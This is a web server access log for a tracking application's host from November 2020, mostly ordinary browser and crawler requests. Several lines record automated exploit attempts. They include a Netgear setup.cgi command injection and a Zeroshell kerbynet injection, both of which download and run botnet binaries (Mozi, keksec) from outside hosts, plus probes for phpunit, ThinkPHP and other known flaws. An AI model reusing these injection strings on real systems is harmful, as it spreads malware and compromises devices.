fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:47 +0000] "GET /api/users/2 HTTP/1.1" 200 828 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:48 +0000] "GET /precache-manifest.2de4c6667ce5a517243463abc36823dd.js HTTP/1.1" 200 1384 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:48 +0000] "GET /api/devices?all=true HTTP/1.1" 400 495 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:48 +0000] "GET /api/devices?userId=2 HTTP/1.1" 200 678 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:48 +0000] "GET /api/groups?all=true HTTP/1.1" 400 526 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:48 +0000] "GET /api/groups?userId=2 HTTP/1.1" 200 973 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:80 2.57.122.186 - - [27/Nov/2020:08:57:03 +0000] "GET /config/getuser?index=0 HTTP/1.1" 302 554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:57:08 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:08:50:15 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:09:00:32 +0000] "GET /api/devices HTTP/1.1" 200 1222 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:09:00:32 +0000] "GET /images/icon/bomb.png HTTP/1.1" 200 3005 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:09:00:52 +0000] "-" 408 3736 "-" "-"
fenix.geolynx.com.ar:80 114.35.92.232 - - [27/Nov/2020:09:05:00 +0000] "GET / HTTP/1.1" 302 505 "-" "Mozilla/5.0"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:43 +0000] "GET /api/socket HTTP/1.1" 200 1215 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:01:18 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:09:11:20 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:80 219.156.59.147 - - [27/Nov/2020:09:19:53 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://219.156.59.147:48070/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 850 "-" "-"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:12:21 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:38 +0000] "GET /api/devices HTTP/1.1" 200 973 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:42 +0000] "GET /windy.js HTTP/1.1" 200 998 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:25 +0000] "GET /api/socket HTTP/1.1" 200 3998 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:46 +0000] "GET /styles.css HTTP/1.1" 200 491 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:47 +0000] "GET /api/session HTTP/1.1" 200 1352 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:47 +0000] "GET /api/server HTTP/1.1" 200 719 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:48 +0000] "GET /favicon.png HTTP/1.1" 200 24853 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:48 +0000] "GET /images/icon/bomb_blue.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:48 +0000] "GET /images/icon/moto_blue.png HTTP/1.1" 304 746 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:48 +0000] "GET /images/icon/plane_blue.png HTTP/1.1" 304 746 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:48 +0000] "GET /images/icon/truck_blue.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:48 +0000] "GET /api/devices HTTP/1.1" 200 429 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/moto_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/truck_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/plane_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/bomb_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/plane_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/moto_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/truck_grey.png HTTP/1.1" 304 3939 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/moto_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/plane_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /images/icon/truck_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:50 +0000] "GET /manifest.json HTTP/1.1" 304 3939 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:50 +0000] "GET /api/devices HTTP/1.1" 200 429 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:50 +0000] "GET /images/icon/bomb_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:50 +0000] "GET /images/icon/bomb_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:50 +0000] "GET /images/marker_home.png HTTP/1.1" 304 203 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:51 +0000] "GET /images/marker.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:52 +0000] "GET /service-worker.js HTTP/1.1" 200 1054 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:52 +0000] "GET /precache-manifest.2de4c6667ce5a517243463abc36823dd.js HTTP/1.1" 200 1384 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:53 +0000] "GET /api/devices HTTP/1.1" 200 429 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:09:24:00 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:24:11 +0000] "-" 408 3736 "-" "-"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:09:24:13 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:23:49 +0000] "GET /api/socket HTTP/1.1" 200 918 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:09:33:50 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:80 185.172.110.235 - - [27/Nov/2020:09:40:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 302 593 "http://198.199.75.218:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0"
fenix.geolynx.com.ar:80 163.172.120.214 - - [27/Nov/2020:09:41:41 +0000] "GET / HTTP/1.1" 302 547 "-" "python-requests/2.25.0"
fenix.geolynx.com.ar:443 163.172.120.214 - - [27/Nov/2020:09:41:42 +0000] "GET / HTTP/1.1" 200 4942 "-" "python-requests/2.25.0"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:34:51 +0000] "GET /api/socket HTTP/1.1" 200 4079 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:45:54 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 35.192.86.121 - - [27/Nov/2020:09:58:12 +0000] "\x16\x03\x01" 400 0 "-" "-"
fenix.geolynx.com.ar:80 35.192.86.121 - - [27/Nov/2020:09:58:15 +0000] "OPTIONS / HTTP/1.0" 302 510 "-" "-"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:09:56:57 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 91.241.19.84 - - [27/Nov/2020:10:17:53 +0000] "POST /mifs/.;/services/LogService HTTP/1.1" 404 4100 "https://198.199.75.218:443" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:443 91.241.19.84 - - [27/Nov/2020:10:17:55 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 4100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:443 91.241.19.84 - - [27/Nov/2020:10:17:57 +0000] "GET /console/ HTTP/1.1" 404 4100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:10:08:00 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 91.241.19.84 - - [27/Nov/2020:10:18:03 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 4032 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:443 91.241.19.84 - - [27/Nov/2020:10:18:03 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 4100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:443 91.241.19.84 - - [27/Nov/2020:10:18:07 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:10:19:03 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:10:30:06 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 41.60.236.198 - - [27/Nov/2020:10:47:01 +0000] "GET / HTTP/1.1" 302 491 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:10:41:08 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 192.241.219.52 - - [27/Nov/2020:10:53:36 +0000] "GET /portal/redlion HTTP/1.1" 302 519 "-" "Mozilla/5.0 zgrab/0.x"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:10:52:09 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 149.129.139.90 - - [27/Nov/2020:11:11:34 +0000] "GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0a/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%22wget%20http://198.144.190.5/bins/keksec.x86%20-O%20/tmp/.keksec.x86;curl%20http://198.144.190.5/bins/keksec.x86%20-O%20/tmp/.keksec.x86;%20chmod%20777%20/tmp/.keksec.x86;%20/tmp/.keksec.x86%22%0a' HTTP/1.1" 302 1218 "-" "python-requests/2.3.0 CPython/2.7.18 Windows/10"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:11:03:12 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 66.249.66.157 - - [27/Nov/2020:11:16:05 +0000] "GET / HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:11:14:16 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:11:25:19 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 104.199.118.92 - - [27/Nov/2020:11:36:12 +0000] "HEAD / HTTP/1.1" 200 4029 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
geolynx.com.ar:443 34.83.109.175 - - [27/Nov/2020:11:36:13 +0000] "HEAD / HTTP/1.1" 200 4066 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
fenix.geolynx.com.ar:80 35.227.180.33 - - [27/Nov/2020:11:36:13 +0000] "HEAD / HTTP/1.1" 302 233 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
fenix.geolynx.com.ar:443 35.227.180.33 - - [27/Nov/2020:11:36:13 +0000] "HEAD / HTTP/1.1" 200 4097 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
geolynx.com.ar:80 35.185.197.215 - - [27/Nov/2020:11:36:13 +0000] "HEAD / HTTP/1.1" 302 227 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
geolynx.com.ar:443 35.185.197.215 - - [27/Nov/2020:11:36:14 +0000] "HEAD / HTTP/1.1" 200 4066 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
fenix.geolynx.com.ar:80 95.123.41.94 - - [27/Nov/2020:11:41:48 +0000] "GET / HTTP/1.1" 302 491 "-" "Mozilla/5.0 zgrab/0.x"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:11:36:22 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:11:47:26 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:11:58:29 +0000] "GET /api/socket HTTP/1.1" 200 3998 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:12:14:26 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
geolynx.com.ar:80 66.249.66.154 - - [27/Nov/2020:12:33:53 +0000] "GET /robots.txt HTTP/1.1" 302 555 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:443 66.249.66.84 - - [27/Nov/2020:12:33:53 +0000] "GET /robots.txt HTTP/1.1" 404 4173 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:80 66.249.66.69 - - [27/Nov/2020:12:33:53 +0000] "GET / HTTP/1.1" 302 535 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:443 66.249.66.84 - - [27/Nov/2020:12:33:54 +0000] "GET / HTTP/1.1" 200 3455 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:12:25:29 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:12:36:32 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 122.228.19.80 - - [27/Nov/2020:12:49:21 +0000] "GET / HTTP/1.1" 200 7203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
fenix.geolynx.com.ar:443 122.228.19.80 - - [27/Nov/2020:12:49:27 +0000] "GET / HTTP/1.0" 400 0 "-" "-"
fenix.geolynx.com.ar:443 122.228.19.80 - - [27/Nov/2020:12:49:27 +0000] "GET /favicon.png HTTP/1.1" 200 28438 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
fenix.geolynx.com.ar:443 122.228.19.80 - - [27/Nov/2020:12:49:28 +0000] "GET / HTTP/1.0" 400 0 "-" "-"
fenix.geolynx.com.ar:443 122.228.19.80 - - [27/Nov/2020:12:49:30 +0000] "GET / HTTP/1.0" 400 0 "-" "-"
fenix.geolynx.com.ar:80 172.105.77.209 - - [27/Nov/2020:12:55:47 +0000] "-" 408 0 "-" "-"
